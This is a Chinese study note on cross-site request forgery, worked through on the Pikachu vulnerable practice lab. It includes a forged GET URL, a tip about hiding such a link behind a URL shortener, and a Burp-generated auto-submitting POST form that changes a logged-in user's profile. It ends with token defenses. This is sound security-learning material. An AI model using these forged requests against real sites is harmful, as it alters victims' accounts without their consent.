## CSRF(跨站请求伪造)

Cross-site request forgery 简称为“CSRF” 
在CSRF的攻击场景中攻击者会伪造一个请求 , 然后欺骗目标用户进行点击 ; 用户一旦点击了这个请求，整个攻击就完成了

![image-20231027100228356](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231027100228356.png)

XSS和CSRF的区别:
CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限
XSS是直接盗取到了用户的权限，然后实施破坏

GET型:
这里用pikachu靶场作为演示
**登录后** 利用bp抓修改资料的包 
`GET /pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=fuck&phonenum=110&add=Chian&email=123456789%40outlook.com&submit=submit HTTP/1.1`
在基础上进行修改 payload:
`localhost/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=fuckkkkkk&phonenum=120&add=American&email=123123123123@outlook.com&submit=submit`

这样子发送太过于明显 所以我们可以用短连接生成器让别人看不太出来:
![image-20231027101401366](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231027101401366.png)

------

POST型
既然是post型 那就先bp抓包看看

![image-20231027101618960](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231027101618960.png)

是post的submit 那就不能在URL上动手脚了 这个时候就要用到BP的 CSRF PoC了
![image-20231027101917868](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231027101917868.png)

稍作修改 最后的PoC:

```html
<html>
  <body>
    <form action="http://localhost/pikachu-master/vul/csrf/csrfpost/csrf_post_edit.php" method="POST">
        <input type="hidden" name="sex" value="girl" />
        <input type="hidden" name="phonenum" value="18656565545" />
        <input type="hidden" name="add" value="usa" />
        <input type="hidden" name="email" value="zhangsan@pikachu.com" />
        <input type="hidden" name=" submit" value="submit" />
        <input type="submit" value="Submit request" />
    </form>
    <script>
        document.forms[0].submit();
    </script>
  </body>
</html>
```

用户登录后 点开这个网站 那么就会自动submit 然后修改资料


------

Token型
可以有效的防范CSRF的攻击 
![image-20231027104130999](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231027104130999.png)

利用session和get token有效的防范了CSRF攻击 



